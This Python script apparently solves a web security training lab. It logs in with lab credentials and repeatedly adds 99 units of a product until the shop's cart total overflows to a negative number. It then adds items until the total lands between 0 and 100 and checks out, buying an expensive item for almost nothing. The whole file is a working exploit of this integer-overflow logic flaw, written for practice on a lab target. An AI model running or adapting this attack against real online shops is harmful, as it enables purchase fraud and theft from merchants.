import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_my_account(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def send_target_product_to_cart(self):
        response = self.session.get(self.lab_url)
        prices_and_ids = re.findall(r'\$(.*)\n +<a class="button" href="/product\?productId=(.*)"', response.text)

        target_price = float(prices_and_ids[0][0])
        product_price = 0.0
        product_id = None

        for p_price, p_id in prices_and_ids[1:]:
            if float(p_price) > product_price:
                product_price = float(p_price)
                product_id = p_id

        data = {
            'productId': 1,
            'redir': 'PRODUCT',
            'quantity': 99
        }
        while True:
            self.session.post(self.lab_url + 'cart', data=data)
            response = self.session.get(self.lab_url + 'cart')
            total = float(re.findall(r'<th>Total:</th>\n +<th>(.*)</th>', response.text)[0].replace('$', ''))
            if total < 0:
                print(total)
                if total >= (-99 * target_price):
                    break
            else:
                print(total)

        data['quantity'] = 47
        self.session.post(self.lab_url + 'cart', data=data)
        response = self.session.get(self.lab_url + 'cart')
        total = float(re.findall(r'<th>Total:</th>\n +<th>(.*)</th>', response.text)[0].replace('$', ''))
        print(total)

        data = {
            'productId': product_id,
            'redir': 'PRODUCT',
            'quantity': 1
        }
        while True:
            self.session.post(self.lab_url + 'cart', data=data)
            response = self.session.get(self.lab_url + 'cart')
            total = float(re.findall(r'<th>Total:</th>\n +<th>(.*)</th>', response.text)[0].replace('$', ''))
            if 0 < total < 100:
                print(total)
                break
            else:
                print(total)

    def buy_target_product(self):
        data = {
            'csrf': self.get_csrf_token('cart')
        }
        self.session.post(self.lab_url + 'cart/checkout', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_my_account()
        self.send_target_product_to_cart()
        self.buy_target_product()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
